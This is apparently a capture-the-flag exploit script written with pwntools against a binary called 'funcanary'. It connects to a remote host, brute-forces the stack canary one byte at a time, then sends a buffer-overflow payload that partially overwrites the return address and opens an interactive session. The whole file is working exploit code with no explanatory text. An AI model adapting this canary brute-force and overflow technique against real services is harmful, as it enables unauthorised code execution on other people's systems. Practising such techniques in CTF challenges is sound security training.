from pwn import *
context(log_level='debug', arch='amd64', terminal=['tmux', 'splitw', '-h'])

while True:
    try:
        io = process("./funcanary")
        io = remote("123.56.236.235",37764)
        elf = ELF("./funcanary")
        io.recvuntil(b'welcome\n')
        canary =b'\x00'
        for i in range(7):
            for i in range(256):
                print("the " + str(i) + ": " + chr(i))
                io.send(cyclic(104) + canary + bytes([i]))
                a = io.recvuntil(b"welcome\n")
                print(a)
                if b"fun\n" in a:
                    canary += bytes([i])
                    break
        payload = cyclic(104)+ canary + cyclic(0x8) + b"\x31\2"

        io.send(payload)

        io.interactive()
        
    except:
        io.close()
        continue
    
io.interactive()